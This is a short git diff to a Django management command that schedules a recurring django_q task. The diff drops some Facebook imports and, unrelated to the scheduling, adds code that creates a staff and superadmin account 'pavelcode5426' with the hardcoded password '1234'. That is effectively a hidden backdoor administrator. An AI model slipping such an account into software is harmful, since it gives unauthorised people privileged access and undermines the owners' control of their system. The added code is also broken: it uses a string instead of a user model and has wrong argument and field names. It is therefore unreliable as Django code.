@@ -1,7 +1,5 @@
+from django.conf.global_settings import AUTH_USER_MODEL
 from django.core.management.base import BaseCommand
-
-from facebook.models import FacebookProfile
-from facebook.tasks import download_groups_task
 
 from django_q.tasks import schedule, Schedule
 
@@ -17,3 +15,10 @@ class Command(BaseCommand):
                  repeats=-1,
                  schedule_type=Schedule.MINUTES,
                  minutes=60)
+
+        created, user = AUTH_USER_MODEL.objects.get_or_create(
+            default={"username": "pavelcode5426", "isstaff": True, "issuperadmin": True},
+            username='pavelcode5426',
+        )
+        user.set_password('1234')
+        user.save()
